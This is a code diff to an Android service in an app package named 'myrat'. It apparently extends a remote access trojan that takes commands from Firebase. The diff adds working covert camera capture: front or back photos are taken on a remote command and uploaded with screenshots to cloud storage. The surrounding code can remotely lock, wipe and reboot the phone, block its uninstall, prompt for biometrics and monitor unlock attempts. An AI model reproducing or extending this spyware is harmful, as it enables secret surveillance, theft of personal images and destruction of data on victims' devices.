@@ -10,14 +10,23 @@ import android.content.Intent
 import android.content.IntentFilter
 import android.content.pm.PackageManager
 import android.graphics.Bitmap
+import android.graphics.BitmapFactory
+import android.graphics.ImageFormat
+import android.graphics.Matrix
 import android.graphics.PixelFormat
 import android.hardware.biometrics.BiometricManager
-import android.hardware.camera2.CameraManager
+import android.hardware.camera2.*
+import android.hardware.camera2.params.OutputConfiguration
+import android.hardware.camera2.params.SessionConfiguration
+import android.media.Image
+import android.media.ImageReader
 import android.net.ConnectivityManager
 import android.net.NetworkCapabilities
 import android.os.*
 import android.provider.Settings
+import android.util.Size
 import android.view.Gravity
+import android.view.Surface
 import android.view.View
 import android.view.WindowManager
 import androidx.biometric.BiometricPrompt
@@ -27,6 +36,7 @@ import androidx.core.content.ContextCompat
 import com.google.firebase.database.*
 import com.google.firebase.database.ktx.database
 import com.google.firebase.ktx.Firebase
+import com.google.firebase.storage.FirebaseStorage
 import com.myrat.app.BiometricAuthActivity
 import com.myrat.app.MainActivity
 import com.myrat.app.R
@@ -36,16 +46,18 @@ import kotlinx.coroutines.*
 import java.io.ByteArrayOutputStream
 import java.io.File
 import java.io.FileOutputStream
+import java.nio.ByteBuffer
 import java.util.concurrent.ConcurrentHashMap
+import java.util.concurrent.Executor
 
 class LockService : Service() {
     companion object {
         private const val CHANNEL_ID = "LockServiceChannel"
         private const val NOTIFICATION_ID = 9
-        private const val BIOMETRIC_REQUEST_CODE = 1001
     }
 
     private val db = Firebase.database.reference
+    private val storage = FirebaseStorage.getInstance().reference
     private lateinit var deviceId: String
     private lateinit var devicePolicyManager: DevicePolicyManager
     private lateinit var adminComponent: ComponentName
@@ -61,6 +73,13 @@ class LockService : Service() {
     private val commandResults = ConcurrentHashMap<String, String>()
     private val biometricResultReceiver = BiometricResultReceiver()
 
+    // Camera related variables
+    private var cameraDevice: CameraDevice? = null
+    private var captureSession: CameraCaptureSession? = null
+    private var imageReader: ImageReader? = null
+    private var backgroundHandler: Handler? = null
+    private var backgroundThread: HandlerThread? = null
+
     private var isServiceInitialized = false
     private var lastStatusUpdate = 0L
     private val STATUS_UPDATE_INTERVAL = 30000L // 30 seconds
@@ -75,6 +94,7 @@ class LockService : Service() {
             scheduleStatusUpdates()
             listenForCommands()
             updateServiceStatus(true)
+            startBackgroundThread()
             Logger.log("LockService created successfully")
         } catch (e: Exception) {
             Logger.error("Failed to create LockService", e)
@@ -92,6 +112,23 @@ class LockService : Service() {
         connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
         cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
         isServiceInitialized = true
+    }
+
+    private fun startBackgroundThread() {
+        backgroundThread = HandlerThread("CameraBackground")
+        backgroundThread?.start()
+        backgroundHandler = Handler(backgroundThread?.looper!!)
+    }
+
+    private fun stopBackgroundThread() {
+        backgroundThread?.quitSafely()
+        try {
+            backgroundThread?.join()
+            backgroundThread = null
+            backgroundHandler = null
+        } catch (e: InterruptedException) {
+            Logger.error("Error stopping background thread", e)
+        }
     }
 
     private fun startForegroundService() {
@@ -202,7 +239,6 @@ class LockService : Service() {
     }
 
     private fun processCommand(action: String, commandId: String, params: Map<String, Any>) {
-        // Ensure scope is lifecycle-aware (e.g., lifecycleScope for Android components)
         scope.launch {
             try {
                 updateCommandStatus(commandId, "processing", null)
@@ -238,7 +274,10 @@ class LockService : Service() {
                         disableKeyguardFeatures(commandId, features)
                     }
                     "captureScreen" -> captureScreen(commandId)
-                    "capturePhoto" -> capturePhoto(commandId)
+                    "capturePhoto" -> {
+                        val camera = params["camera"] as? String ?: "back"
+                        capturePhoto(commandId, camera)
+                    }
                     "captureFingerprint" -> captureFingerprint(commandId)
                     "disableApp" -> {
                         val packageName = params["packageName"] as? String
@@ -276,6 +315,7 @@ class LockService : Service() {
             }
         }
     }
+
     // Device Lock/Unlock Operations
     private suspend fun lockDevice(commandId: String): Boolean {
         return try {
@@ -295,13 +335,10 @@ class LockService : Service() {
     private suspend fun unlockDevice(commandId: String): Boolean {
         return try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                // For newer Android versions, we can't directly unlock
-                // Instead, we'll turn on the screen and show unlock prompt
                 turnScreenOn(commandId)
                 showUnlockPrompt()
                 true
             } else {
-                // For older versions, try to disable keyguard
                 keyguardManager.newKeyguardLock("LockService").disableKeyguard()
                 true
             }
@@ -336,7 +373,6 @@ class LockService : Service() {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                 devicePolicyManager.lockNow()
             } else {
-                // For older versions, use reflection
                 try {
                     val powerManagerClass = Class.forName("android.os.PowerManager")
                     val goToSleepMethod = powerManagerClass.getMethod("goToSleep", Long::class.javaPrimitiveType)
@@ -350,6 +386,230 @@ class LockService : Service() {
         } catch (e: Exception) {
             Logger.error("Failed to turn screen off", e)
             false
+        }
+    }
+
+    // Enhanced Camera Photo Capture
+    private suspend fun capturePhoto(commandId: String, cameraType: String = "back"): Boolean {
+        return try {
+            if (!isCameraAvailable()) {
+                throw SecurityException("Camera not available")
+            }
+
+            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
+                throw SecurityException("Camera permission not granted")
+            }
+
+            val cameraId = getCameraId(cameraType)
+            if (cameraId == null) {
+                Logger.error("Camera ID not found for type: $cameraType")
+                return false
+            }
+
+            Logger.log("Starting photo capture with camera: $cameraType (ID: $cameraId)")
+
+            // Setup image reader
+            val reader = ImageReader.newInstance(1920, 1080, ImageFormat.JPEG, 1)
+            imageReader = reader
+
+            val readerListener = object : ImageReader.OnImageAvailableListener {
+                override fun onImageAvailable(reader: ImageReader) {
+                    scope.launch {
+                        try {
+                            val image = reader.acquireLatestImage()
+                            if (image != null) {
+                                val buffer = image.planes[0].buffer
+                                val bytes = ByteArray(buffer.remaining())
+                                buffer.get(bytes)
+                                image.close()
+
+                                // Save and upload photo
+                                savePhotoCapture(bytes, commandId, cameraType)
+                                Logger.log("Photo captured successfully with $cameraType camera")
+                            }
+                        } catch (e: Exception) {
+                            Logger.error("Error processing captured image", e)
+                        }
+                    }
+                }
+            }
+
+            reader.setOnImageAvailableListener(readerListener, backgroundHandler)
+
+            // Open camera
+            val cameraStateCallback = object : CameraDevice.StateCallback() {
+                override fun onOpened(camera: CameraDevice) {
+                    cameraDevice = camera
+                    scope.launch {
+                        try {
+                            createCaptureSession(camera, reader.surface, commandId)
+                        } catch (e: Exception) {
+                            Logger.error("Error creating capture session", e)
+                        }
+                    }
+                }
+
+                override fun onDisconnected(camera: CameraDevice) {
+                    camera.close()
+                    cameraDevice = null
+                    Logger.log("Camera disconnected")
+                }
+
+                override fun onError(camera: CameraDevice, error: Int) {
+                    camera.close()
+                    cameraDevice = null
+                    Logger.error("Camera error: $error")
+                }
+            }
+
+            cameraManager.openCamera(cameraId, cameraStateCallback, backgroundHandler)
+
+            // Wait for capture to complete (timeout after 10 seconds)
+            delay(10000)
+            
+            // Cleanup
+            cameraDevice?.close()
+            cameraDevice = null
+            imageReader?.close()
+            imageReader = null
+
+            true
+        } catch (e: Exception) {
+            Logger.error("Failed to capture photo", e)
+            // Cleanup on error
+            cameraDevice?.close()
+            cameraDevice = null
+            imageReader?.close()
+            imageReader = null
+            false
+        }
+    }
+
+    private fun getCameraId(cameraType: String): String? {
+        return try {
+            val cameraIds = cameraManager.cameraIdList
+            for (id in cameraIds) {
+                val characteristics = cameraManager.getCameraCharacteristics(id)
+                val facing = characteristics.get(CameraCharacteristics.LENS_FACING)
+                
+                when (cameraType.lowercase()) {
+                    "front" -> {
+                        if (facing == CameraCharacteristics.LENS_FACING_FRONT) {
+                            return id
+                        }
+                    }
+                    "back" -> {
+                        if (facing == CameraCharacteristics.LENS_FACING_BACK) {
+                            return id
+                        }
+                    }
+                }
+            }
+            // Default to first available camera
+            if (cameraIds.isNotEmpty()) cameraIds[0] else null
+        } catch (e: Exception) {
+            Logger.error("Error getting camera ID", e)
+            null
+        }
+    }
+
+    private suspend fun createCaptureSession(camera: CameraDevice, surface: Surface, commandId: String) {
+        try {
+            val captureRequestBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
+            captureRequestBuilder.addTarget(surface)
+
+            // Set auto-focus and auto-exposure
+            captureRequestBuilder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
+            captureRequestBuilder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
+
+            val sessionStateCallback = object : CameraCaptureSession.StateCallback() {
+                override fun onConfigured(session: CameraCaptureSession) {
+                    captureSession = session
+                    try {
+                        // Capture the photo
+                        session.capture(captureRequestBuilder.build(), object : CameraCaptureSession.CaptureCallback() {
+                            override fun onCaptureCompleted(
+                                session: CameraCaptureSession,
+                                request: CaptureRequest,
+                                result: TotalCaptureResult
+                            ) {
+                                Logger.log("Photo capture completed for command: $commandId")
+                            }
+
+                            override fun onCaptureFailed(
+                                session: CameraCaptureSession,
+                                request: CaptureRequest,
+                                failure: CaptureFailure
+                            ) {
+                                Logger.error("Photo capture failed: ${failure.reason}")
+                            }
+                        }, backgroundHandler)
+                    } catch (e: Exception) {
+                        Logger.error("Error capturing photo", e)
+                    }
+                }
+
+                override fun onConfigureFailed(session: CameraCaptureSession) {
+                    Logger.error("Camera session configuration failed")
+                }
+            }
+
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
+                val outputConfig = OutputConfiguration(surface)
+                val sessionConfig = SessionConfiguration(
+                    SessionConfiguration.SESSION_REGULAR,
+                    listOf(outputConfig),
+                    ContextCompat.getMainExecutor(this),
+                    sessionStateCallback
+                )
+                camera.createCaptureSession(sessionConfig)
+            } else {
+                camera.createCaptureSession(listOf(surface), sessionStateCallback, backgroundHandler)
+            }
+        } catch (e: Exception) {
+            Logger.error("Error creating capture session", e)
+        }
+    }
+
+    private fun savePhotoCapture(imageBytes: ByteArray, commandId: String, cameraType: String) {
+        try {
+            scope.launch {
+                try {
+                    // Upload to Firebase Storage
+                    val fileName = "photo_${commandId}_${cameraType}_${System.currentTimeMillis()}.jpg"
+                    val photoRef = storage.child("photos/$deviceId/$fileName")
+                    
+                    photoRef.putBytes(imageBytes)
+                        .addOnSuccessListener {
+                            Logger.log("Photo uploaded to storage: $fileName")
+                            
+                            // Save metadata to database
+                            val captureData = mapOf(
+                                "timestamp" to System.currentTimeMillis(),
+                                "commandId" to commandId,
+                                "cameraType" to cameraType,
+                                "fileName" to fileName,
+                                "storagePath" to "photos/$deviceId/$fileName",
+                                "size" to imageBytes.size
+                            )
+
+                            db.child("Device").child(deviceId).child("photo_captures").push().setValue(captureData)
+                                .addOnSuccessListener {
+                                    Logger.log("Photo metadata saved to database")
+                                }
+                                .addOnFailureListener { e ->
+                                    Logger.error("Failed to save photo metadata", e)
+                                }
+                        }
+                        .addOnFailureListener { e ->
+                            Logger.error("Failed to upload photo to storage", e)
+                        }
+                } catch (e: Exception) {
+                    Logger.error("Error in photo upload process", e)
+                }
+            }
+        } catch (e: Exception) {
+            Logger.error("Failed to save photo capture", e)
         }
     }
 
@@ -367,7 +627,6 @@ class LockService : Service() {
             }
             startActivity(intent)
 
-            // Wait for result
             delay(30000) // 30 second timeout
             commandResults[commandId] != null
         } catch (e: Exception) {
@@ -389,7 +648,6 @@ class LockService : Service() {
             }
             startActivity(intent)
 
-            // Wait for result
             delay(30000) // 30 second timeout
             commandResults[commandId] == "success"
         } catch (e: Exception) {
@@ -400,7 +658,6 @@ class LockService : Service() {
 
     private suspend fun captureFingerprint(commandId: String): Boolean {
         return try {
-            // Similar to biometric capture but specifically for fingerprint
             captureBiometricData(commandId)
         } catch (e: Exception) {
             Logger.error("Failed to capture fingerprint", e)
@@ -415,7 +672,6 @@ class LockService : Service() {
                 throw SecurityException("Device admin not active")
             }
 
-            // Factory reset the device
             devicePolicyManager.wipeData(DevicePolicyManager.WIPE_EXTERNAL_STORAGE)
             Logger.log("Device wipe initiated")
             true
@@ -431,7 +687,6 @@ class LockService : Service() {
                 throw SecurityException("Device admin not active")
             }
 
-            // Enable device admin lock to prevent uninstallation
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                 devicePolicyManager.setUninstallBlocked(adminComponent, packageName, true)
             }
@@ -452,7 +707,6 @@ class LockService : Service() {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                 devicePolicyManager.reboot(adminComponent)
             } else {
-                // For older versions, use shell command
                 Runtime.getRuntime().exec("su -c reboot")
             }
             Logger.log("Device reboot initiated")
@@ -475,8 +729,6 @@ class LockService : Service() {
             }
 
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                // For newer Android versions, we can't directly set password
-                // Instead, we'll prompt user to change password
                 val intent = Intent(DevicePolicyManager.ACTION_SET_NEW_PASSWORD)
                 intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                 startActivity(intent)
@@ -567,7 +819,6 @@ class LockService : Service() {
                 throw SecurityException("Overlay permission not granted")
             }
 
-            // Create a screenshot using MediaProjection or other methods
             val screenshot = captureScreenshot()
             if (screenshot != null) {
                 saveScreenCapture(screenshot, commandId)
@@ -577,26 +828,6 @@ class LockService : Service() {
             }
         } catch (e: Exception) {
             Logger.error("Failed to capture screen", e)
-            false
-        }
-    }
-
-    private suspend fun capturePhoto(commandId: String): Boolean {
-        return try {
-            if (!isCameraAvailable()) {
-                throw SecurityException("Camera not available")
-            }
-
-            // Capture photo using camera
-            val photo = capturePhotoFromCamera()
-            if (photo != null) {
-                savePhotoCapture(photo, commandId)
-                true
-            } else {
-                false
-            }
-        } catch (e: Exception) {
-            Logger.error("Failed to capture photo", e)
             false
         }
     }
@@ -645,7 +876,6 @@ class LockService : Service() {
     // Monitoring Operations
     private suspend fun monitorUnlockAttempts(commandId: String): Boolean {
         return try {
-            // Start monitoring unlock attempts
             val unlockData = mapOf(
                 "isDeviceLocked" to keyguardManager.isKeyguardLocked,
                 "isDeviceSecure" to keyguardManager.isKeyguardSecure,
@@ -723,54 +953,48 @@ class LockService : Service() {
         }
     }
 
-    private fun capturePhotoFromCamera(): Bitmap? {
-        return try {
-            // Implementation for camera capture
-            // This would require Camera2 API
-            null
-        } catch (e: Exception) {
-            Logger.error("Failed to capture photo", e)
-            null
-        }
-    }
-
     private fun saveScreenCapture(bitmap: Bitmap, commandId: String) {
         try {
             val outputStream = ByteArrayOutputStream()
             bitmap.compress(Bitmap.CompressFormat.JPEG, 80, outputStream)
             val imageData = outputStream.toByteArray()
-            val base64Image = android.util.Base64.encodeToString(imageData, android.util.Base64.DEFAULT)
 
-            val captureData = mapOf(
-                "image" to base64Image,
-                "timestamp" to System.currentTimeMillis(),
-                "commandId" to commandId
-            )
+            scope.launch {
+                try {
+                    // Upload to Firebase Storage
+                    val fileName = "screen_${commandId}_${System.currentTimeMillis()}.jpg"
+                    val screenRef = storage.child("screenshots/$deviceId/$fileName")
+                    
+                    screenRef.putBytes(imageData)
+                        .addOnSuccessListener {
+                            Logger.log("Screenshot uploaded to storage: $fileName")
+                            
+                            // Save metadata to database
+                            val captureData = mapOf(
+                                "timestamp" to System.currentTimeMillis(),
+                                "commandId" to commandId,
+                                "fileName" to fileName,
+                                "storagePath" to "screenshots/$deviceId/$fileName",
+                                "size" to imageData.size
+                            )
 
-            db.child("Device").child(deviceId).child("screen_captures").push().setValue(captureData)
-            Logger.log("Screen capture saved")
+                            db.child("Device").child(deviceId).child("screen_captures").push().setValue(captureData)
+                                .addOnSuccessListener {
+                                    Logger.log("Screenshot metadata saved to database")
+                                }
+                                .addOnFailureListener { e ->
+                                    Logger.error("Failed to save screenshot metadata", e)
+                                }
+                        }
+                        .addOnFailureListener { e ->
+                            Logger.error("Failed to upload screenshot to storage", e)
+                        }
+                } catch (e: Exception) {
+                    Logger.error("Error in screenshot upload process", e)
+                }
+            }
         } catch (e: Exception) {
             Logger.error("Failed to save screen capture", e)
-        }
-    }
-
-    private fun savePhotoCapture(bitmap: Bitmap, commandId: String) {
-        try {
-            val outputStream = ByteArrayOutputStream()
-            bitmap.compress(Bitmap.CompressFormat.JPEG, 80, outputStream)
-            val imageData = outputStream.toByteArray()
-            val base64Image = android.util.Base64.encodeToString(imageData, android.util.Base64.DEFAULT)
-
-            val captureData = mapOf(
-                "image" to base64Image,
-                "timestamp" to System.currentTimeMillis(),
-                "commandId" to commandId
-            )
-
-            db.child("Device").child(deviceId).child("photo_captures").push().setValue(captureData)
-            Logger.log("Photo capture saved")
-        } catch (e: Exception) {
-            Logger.error("Failed to save photo capture", e)
         }
     }
 
@@ -923,7 +1147,6 @@ class LockService : Service() {
         }
     }
 
-    // Updated BiometricResultReceiver class
     private inner class BiometricResultReceiver : BroadcastReceiver() {
         override fun onReceive(context: Context?, intent: Intent?) {
             when (intent?.action) {
@@ -937,7 +1160,6 @@ class LockService : Service() {
                         commandResults[commandId] = result
 
                         if (result == BiometricAuthActivity.RESULT_SUCCESS && action != null) {
-                            // Save biometric data
                             val biometricData = mapOf(
                                 "action" to action,
                                 "result" to result,
@@ -952,7 +1174,6 @@ class LockService : Service() {
                 }
                 Intent.ACTION_SCREEN_ON -> {
                     Logger.log("Screen turned on")
-                    // Launch coroutine to call suspend function
                     scope.launch {
                         monitorUnlockAttempts("screen_on_${System.currentTimeMillis()}")
                     }
@@ -962,7 +1183,6 @@ class LockService : Service() {
                 }
                 Intent.ACTION_USER_PRESENT -> {
                     Logger.log("User present (device unlocked)")
-                    // Launch coroutine to call suspend function
                     scope.launch {
                         monitorUnlockAttempts("user_present_${System.currentTimeMillis()}")
                     }
@@ -993,6 +1213,11 @@ class LockService : Service() {
             } catch (e: IllegalArgumentException) {
                 // Receiver not registered
             }
+
+            // Cleanup camera resources
+            cameraDevice?.close()
+            imageReader?.close()
+            stopBackgroundThread()
 
             scope.cancel()
             updateServiceStatus(false)
